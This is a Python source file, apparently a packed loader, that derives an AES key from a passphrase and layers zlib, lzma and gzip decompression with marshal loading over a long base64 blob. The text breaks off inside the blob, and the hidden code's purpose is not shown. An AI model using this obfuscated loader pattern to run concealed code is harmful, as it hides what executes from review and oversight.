# Encrypted Python Script
import os, base64, zlib, gzip, lzma, getpass, marshal, hashlib, sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

PBKDF2_ITERS = 300000
SALT_LEN = 32
KEY_LEN = 32

def derive_key_from_pass(passphrase: str, salt: bytes) -> bytes:
    return PBKDF2(passphrase.encode("utf-8"), salt, dkLen=KEY_LEN, count=PBKDF2_ITERS)

def multi_decompress(data: bytes):
    lzmaed = zlib.decompress(data)
    gzipped = lzma.decompress(lzmaed)
    marshaled = gzip.decompress(gzipped)
    code = marshal.loads(marshaled)
    return code

def coophalco():
    try:
        b64_data = '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